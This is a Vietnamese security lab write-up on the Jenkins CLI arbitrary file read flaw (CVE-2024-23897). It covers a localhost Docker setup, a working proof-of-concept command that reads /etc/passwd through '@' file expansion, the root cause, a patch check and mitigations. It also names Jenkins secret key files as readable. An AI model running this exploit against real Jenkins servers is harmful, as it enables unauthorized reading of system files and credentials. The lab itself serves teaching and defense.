# Lab 3.2 — Jenkins CLI Arbitrary File Read (CVE-2024-23897)

**Người phụ trách:** Lê Đạt (Trưởng nhóm)
**Loại lỗ hổng:** Arbitrary File Read (CWE-22 Path Traversal) · **CVSS 3.1: 9.8 (Critical)**
**Thành phần:** Jenkins built-in CLI (thư viện phân tích tham số `args4j`)

> ⚠️ Lab chạy **hoàn toàn nội bộ** qua Docker, chỉ bind `127.0.0.1`. Không expose ra Internet,
> không nhắm vào hệ thống bên thứ ba. Khai thác chỉ dừng ở mức **proof-of-concept vô hại**
> (đọc file không nhạy cảm như `/etc/hostname`, `/etc/passwd`), KHÔNG trích xuất secret thật.

## 1. Tóm tắt lỗ hổng
Jenkins CLI dùng thư viện `args4j` để phân tích tham số dòng lệnh. `args4j` tự động mở rộng
ký tự `@` đứng trước một đường dẫn file: `@/path/to/file` sẽ được thay bằng **nội dung của
file đó**. Các phiên bản Jenkins ≤ 2.441 (LTS ≤ 2.426.2) **không tắt** tính năng này, nên kẻ
tấn công gửi lệnh CLI với tham số `@<đường-dẫn>` có thể buộc Jenkins đọc và trả về nội dung
file tùy ý trên máy chủ — kể cả khi chỉ có quyền ẩn danh (Overall/Read).

- **CVE:** CVE-2024-23897 — Jenkins Security Advisory 2024-01-24 (SECURITY-3314)
- **Phiên bản bị ảnh hưởng:** Jenkins weekly ≤ 2.441, LTS ≤ 2.426.2
- **Phiên bản vá:** Jenkins weekly 2.442, LTS 2.426.3

## 2. Dựng lab (môi trường bị ảnh hưởng)
```bash
docker compose up -d
# Chờ Jenkins khởi động (~30-60s)
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8080/login   # 200 là sẵn sàng
```
Giao diện: http://127.0.0.1:8080  — xác nhận version tại `/about` (Jenkins 2.441).

## 3. Chứng minh lỗ hổng (PoC vô hại)
```bash
# Tải CLI client từ chính instance đang chạy (đúng hướng dẫn chính thức)
curl -s http://127.0.0.1:8080/jnlpJars/jenkins-cli.jar -o scripts/jenkins-cli.jar

# Dùng một lệnh CLI hợp lệ với tham số bắt đầu bằng '@' trỏ tới file mục tiêu.
# Lệnh sẽ báo lỗi cú pháp NHƯNG thông báo lỗi để LỘ từng dòng nội dung file -> chứng minh đọc được file.
java -jar scripts/jenkins-cli.jar -s http://127.0.0.1:8080/ -http \
     connect-node @/etc/hostname 2>&1 | tee evidence/poc_hostname.txt

java -jar scripts/jenkins-cli.jar -s http://127.0.0.1:8080/ -http \
     connect-node @/etc/passwd 2>&1 | tee evidence/poc_passwd.txt
```
Nội dung `/etc/hostname` / `/etc/passwd` xuất hiện trong thông báo lỗi ⇒ **đọc file tùy ý thành công**.
Về lý thuyết, file `/var/jenkins_home/secret.key`, `secrets/master.key` (dùng giải mã credential)
nằm trong phạm vi có thể đọc — lab **không** trích xuất các file này.

## 4. Nguyên nhân gốc
`args4j` mặc định bật tính năng `@`-file expansion. Jenkins ở phiên bản bị ảnh hưởng không gọi
`CmdLineParser.setExpandAtFiles(false)` và không giới hạn phạm vi file, nên bất kỳ tham số CLI
nào cũng có thể bị thay bằng nội dung file hệ thống.

## 5. Vá & chứng minh đã khắc phục
Bản vá 2.442 **tắt** `@`-file expansion trong Jenkins CLI.
```bash
docker compose down
docker compose -f docker-compose.patched.yml up -d
curl -s http://127.0.0.1:8080/jnlpJars/jenkins-cli.jar -o scripts/jenkins-cli.jar
java -jar scripts/jenkins-cli.jar -s http://127.0.0.1:8080/ -http \
     connect-node @/etc/hostname 2>&1 | tee evidence/after_patch_hostname.txt
```
Sau khi vá: tham số `@/etc/hostname` **không còn** được mở rộng thành nội dung file
(được coi như chuỗi tên node thường) ⇒ **không đọc được file** ⇒ đã khắc phục.

### Biện pháp phòng chống
1. **Nâng cấp** Jenkins lên ≥ 2.442 (weekly) / ≥ 2.426.3 (LTS).
2. Nếu chưa vá kịp: **tắt Jenkins CLI** hoặc chặn cổng CLI (TCP 50000 & endpoint `/cli`) bằng
   reverse proxy / firewall.
3. Bật Authorization chặt chẽ, không cấp quyền Overall/Read cho người dùng ẩn danh.
4. Giới hạn truy cập mạng tới cổng quản trị, theo dõi security advisory của nhà cung cấp.

### Hệ thống/tình huống tương tự
Mọi công cụ có CLI từ xa nhận tham số có thể tham chiếu file trên server (các framework dùng
`args4j`/thư viện parse tương tự) đều có nguy cơ cùng loại nếu không kiểm soát input path.

## 6. Dọn dẹp
```bash
docker compose -f docker-compose.patched.yml down -v
docker compose down -v
```
